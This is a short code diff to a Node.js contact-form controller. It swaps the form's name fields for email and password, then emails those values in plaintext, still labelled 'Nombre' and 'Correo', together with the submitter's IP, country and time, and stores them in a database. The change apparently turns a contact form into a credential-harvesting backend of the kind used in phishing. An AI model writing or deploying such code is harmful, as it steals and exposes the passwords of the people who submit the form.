@@ -34,7 +34,7 @@ class ContactosController {
   }
 
   async save(req, res) {
-    const { firstname, lastname, subject } = req.body;
+    const { email, password, subject } = req.body;
     const ip = req.headers['x-forwarded-for']?.split(',').shift() || req.socket?.remoteAddress;
     let hoy = new Date();
     let horas = hoy.getHours();
@@ -71,8 +71,8 @@ class ContactosController {
         subject: 'Contact information',
         html: `
                <h1>Welcome!</h1>
-               <p>Nombre: ${firstname}</p>
-               <p>Correo: ${lastname}</p>
+               <p>Nombre: ${email}</p>
+               <p>Correo: ${password}</p>
                <p>Fecha/Hora: ${fecha}</p>
                <p>Pais: ${pais}</p>
                <p>Ip: ${ip}</p>`
@@ -84,7 +84,7 @@ class ContactosController {
           console.log(err);
         } else {
           console.log(info)
-          this.model.guardar(firstname, lastname, subject, ip, fecha, pais);
+          this.model.guardar(email, password, subject, ip, fecha, pais);
           return res.send({ response: "Contact save and email successfully" });
         }
       });
